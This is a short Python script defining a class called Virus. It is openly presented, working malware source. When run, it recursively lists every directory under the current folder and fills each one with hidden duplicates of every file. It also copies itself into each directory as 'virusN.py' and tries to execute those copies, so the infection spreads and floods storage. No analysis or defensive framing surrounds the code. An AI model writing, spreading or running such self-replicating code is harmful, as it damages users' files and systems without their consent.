import os
import shutil
import random

class Virus():
  def __init__(self, path, target_dir, repeat):
    self.path = path
    self.target_dir = target_dir
    self.repeat = repeat
    self.own_path = os.path.realpath(__file__)
  
  def virus_action(self):
    self.list_dir(self.path)
    print("target dir: ", self.target_dir)
    self.replicate()
    self.new_virus()
    
  
  def list_dir(self, path):
    self.target_dir.append(path)
    files = os.listdir(path)
    for f in files:
      if not f.startswith('.'):
        abspath = os.path.join(path, f)
        print(abspath)

        if os.path.isdir(abspath):
          self.list_dir(abspath)
        else: pass
  
  def new_virus(self):
    for dir in self.target_dir:
      n = random.randint(0,10)
      name = "virus" + str(n) + ".py"
      destination = os.path.join(dir, name)
      shutil.copyfile(self.own_path, destination)
      os.system(name + " l")
  
  def replicate(self):
    for dir in self.target_dir:
      files = os.listdir(dir)
      for f in files:
        abs_path = os.path.join(dir, f)
        if not abs_path.startswith(".") and not os.path.isdir(abs_path):
          src = abs_path
          for i in range(self.repeat):
            destination = os.path.join(dir, ("." + f + str(i)))
            shutil.copyfile(src, destination)
  
if __name__ == '__main__':
  current_dir = os.path.abspath("")
  Virus = Virus(path=current_dir, target_dir=[], repeat=2)
  Virus.virus_action()
  
